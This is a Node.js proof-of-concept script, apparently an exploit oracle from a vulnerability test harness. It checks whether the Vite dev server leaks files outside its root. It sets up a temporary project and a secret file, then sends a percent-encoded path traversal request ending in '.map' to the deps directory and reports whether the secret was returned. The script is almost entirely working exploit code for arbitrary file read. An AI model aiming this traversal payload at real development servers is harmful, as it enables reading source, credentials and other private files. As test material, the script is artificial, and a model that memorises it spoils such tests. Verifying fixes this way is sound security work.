const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const marker = 'vite_map_oracle_' + Date.now() + '_' + Math.random().toString(16).slice(2);

  try {
    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') {
      throw new Error('vite.createServer unavailable');
    }

    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'project');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    const publicDir = path.join(root, 'public');

    fs.mkdirSync(depsDir, { recursive: true });
    fs.mkdirSync(publicDir, { recursive: true });

    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>vite oracle</body></html>');

    const benignMapBody = '{"version":3,"file":"safe.js","sources":["safe.ts"],"names":[],"mappings":""}';
    const benignMapPath = path.join(depsDir, 'safe.js.map');
    fs.writeFileSync(benignMapPath, benignMapBody);

    const secretPath = path.join(base, 'outside-secret.txt');
    const secret = 'TOP_SECRET_' + marker;
    fs.writeFileSync(secretPath, secret);

    const server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'spa',
      server: { middlewareMode: true, fs: { strict: false } }
    });

    function request(url) {
      return new Promise((resolve, reject) => {
        const req = { method: 'GET', url, headers: {} };
        const chunks = [];
        const res = {
          statusCode: 200,
          headers: {},
          setHeader(name, value) { this.headers[String(name).toLowerCase()] = value; },
          getHeader(name) { return this.headers[String(name).toLowerCase()]; },
          writeHead(code, headers) {
            this.statusCode = code;
            if (headers && typeof headers === 'object') {
              for (const k of Object.keys(headers)) this.setHeader(k, headers[k]);
            }
          },
          write(data) {
            if (data !== undefined && data !== null) {
              chunks.push(Buffer.isBuffer(data) ? data : Buffer.from(String(data)));
            }
            return true;
          },
          end(data) {
            if (data !== undefined && data !== null) {
              chunks.push(Buffer.isBuffer(data) ? data : Buffer.from(String(data)));
            }
            resolve({ statusCode: this.statusCode || 200, body: Buffer.concat(chunks).toString('utf8') });
          }
        };

        try {
          server.middlewares(req, res, () => {
            resolve({ statusCode: 404, body: '' });
          });
        } catch (err) {
          reject(err);
        }
      });
    }

    try {
      const benignUrl = '/node_modules/.vite/deps/safe.js.map';
      const benign = await request(benignUrl);
      if (benign.statusCode >= 400 || benign.body.indexOf('"version":3') === -1) {
        throw new Error('benign failed status=' + benign.statusCode + ' body=' + benign.body.slice(0, 160));
      }

      operation_completed = true;

      const maliciousUrl = '/node_modules/.vite/deps/%2e%2e/%2e%2e/%2e%2e/outside-secret.txt.map';
      let mal;
      let malErr = null;
      try {
        mal = await request(maliciousUrl);
      } catch (e) {
        malErr = e;
      }

      if (malErr) {
        exploit_succeeded = false;
        evidence = 'benign_status=' + benign.statusCode + ';malicious_exception=' + (malErr && malErr.message ? malErr.message : String(malErr));
      } else {
        const leaked = mal.body.indexOf(secret) !== -1;
        exploit_succeeded = leaked;
        evidence = 'benign_status=' + benign.statusCode + ';malicious_status=' + mal.statusCode + ';malicious_len=' + mal.body.length + ';leaked=' + leaked;
      }
    } finally {
      await server.close();
    }
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'exception=' + (e && e.message ? e.message : String(e));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();